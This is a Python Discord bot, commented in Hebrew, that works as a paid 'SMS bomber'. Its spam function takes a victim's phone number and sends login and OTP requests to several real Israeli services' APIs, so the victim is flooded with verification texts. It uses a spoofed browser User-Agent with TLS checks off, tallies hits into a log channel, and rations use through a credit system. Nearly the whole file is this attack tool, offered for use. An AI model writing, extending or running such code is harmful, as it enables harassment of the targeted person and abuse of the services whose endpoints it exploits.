import discord
from discord import app_commands
from discord.ext import commands
import os, json, httpx, asyncio
from flask import Flask
from threading import Thread
import datetime

# --- Render Keep-Alive ---
app = Flask('')
@app.route('/')
def home(): return "Bot Online"
def run():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))
def keep_alive():
    Thread(target=run).start()

# --- הגדרות ---
TOKEN = os.getenv("DISCORD_TOKEN")
OWNER_ROLE_NAME = "Owner"
DB_FILE = "database.json"
LOG_CHANNEL_ID = 1499510962296721568

def get_data():
    if not os.path.exists(DB_FILE): return {"credits": {}, "blacklist": []}
    with open(DB_FILE, "r") as f: return json.load(f)

def save_data(data):
    with open(DB_FILE, "w") as f: json.dump(data, f, indent=4)

async def send_log(bot, title, description, color=discord.Color.blue()):
    channel = bot.get_channel(LOG_CHANNEL_ID)
    if channel:
        embed = discord.Embed(title=title, description=description, color=color, timestamp=datetime.datetime.now())
        await channel.send(embed=embed)

# --- מנוע הספאם עם בדיקת הצלחה ---
async def run_spam_with_report(phone):
    clean_p = phone[1:] if phone.startswith('0') else phone
    success_count = 0
    fail_count = 0
    
    # רשימת אתרים לבדיקה
    targets = [
        {"url": "https://api.wolt.com/v1/user/login/otp", "json": {"phone": f"+972{clean_p}"}},
        {"url": "https://www.10bis.co.il/NextApi/User/Login", "json": {"phoneNumber": phone, "isSmsAuth": True}},
        {"url": "https://pango.co.il/api/auth/login", "json": {"phone": phone}},
        {"url": "https://yellow.co.il/api/v1/auth/register-otp", "json": {"phone": phone}},
        {"url": "https://www.dominos.co.il/api/v1/auth/otp", "json": {"phone": phone}},
        {"url": "https://pizzahut.co.il/api/v1/auth/otp", "json": {"phone": phone}}
    ]

    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

    async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
        for t in targets:
            try:
                response = await client.post(t["url"], json=t["json"], headers=headers)
                # אם הקוד הוא בין 200 ל-299, זו הצלחה
                if 200 <= response.status_code < 300:
                    success_count += 1
                else:
                    fail_count += 1
            except:
                fail_count += 1
    
    return success_count, fail_count

# --- בוט ופקודות ---
class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        intents.members = True
        super().__init__(command_prefix="!", intents=intents)
    async def setup_hook(self):
        await self.tree.sync()

bot = MyBot()

@bot.tree.command(name="spam", description="Start SMS Bomber with Report")
async def spam(interaction: discord.Interaction, phone: str):
    data = get_data()
    uid = str(interaction.user.id)
    is_owner = discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME)

    if phone in data["blacklist"]:
        return await interaction.response.send_message("❌ המספר חסום!", ephemeral=True)

    if not is_owner:
        user_credits = data["credits"].get(uid, 0)
        if user_credits <= 0:
            return await interaction.response.send_message("❌ אין קרדיטים!", ephemeral=True)
        data["credits"][uid] -= 1
        save_data(data)

    await interaction.response.send_message(f"💣 מתחיל הפצצה על {phone}. אנא המתן לדוח...", ephemeral=True)
    
    # הפעלת הספאם וקבלת תוצאות
    success, fails = await run_spam_with_report(phone)
    
    # שליחת לוג מפורט לערוץ הלוגים
    log_color = discord.Color.green() if success > fails else discord.Color.red()
    report_text = (
        f"**יעד:** {phone}\n"
        f"**נשלח על ידי:** {interaction.user.mention}\n\n"
        f"✅ הודעות שנשלחו בהצלחה: `{success}`\n"
        f"❌ הודעות שנכשלו: `{fails}`\n"
        f"📊 סה\"כ ניסיונות: `{success + fails}`"
    )
    await send_log(bot, "📊 דוח הפצצת SMS", report_text, log_color)

    # עדכון המשתמש
    await interaction.followup.send(f"✅ ההפצצה הסתיימה! הצלחות: {success}, כישלונות: {fails}.", ephemeral=True)

# פקודות ניהול נוספות (addcredit וכו') נשארות אותו דבר...
# [כאן תוכל להוסיף את שאר הפקודות מהקוד הקודם]

if __name__ == "__main__":
    keep_alive()
    bot.run(TOKEN)
